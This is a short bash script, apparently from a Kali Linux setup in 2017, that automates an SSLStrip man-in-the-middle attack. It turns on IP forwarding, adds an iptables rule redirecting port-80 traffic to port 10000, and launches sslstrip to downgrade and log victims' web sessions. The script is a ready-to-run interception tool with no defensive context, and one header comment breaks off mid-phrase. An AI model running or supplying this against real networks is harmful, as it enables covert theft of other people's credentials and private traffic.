#!/bin/bash

# Kali Linux 2016.2 ettercap and 
# Feb 15 2017
# IMPORTANT.  CALL THIS WITH THE COMMAND . ./helper2.sh   (the extra . <space> in front makes it so the dir changes)

# This script automates the process of running SSLStrip

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000

#Start SSLStrip
sslstrip -a
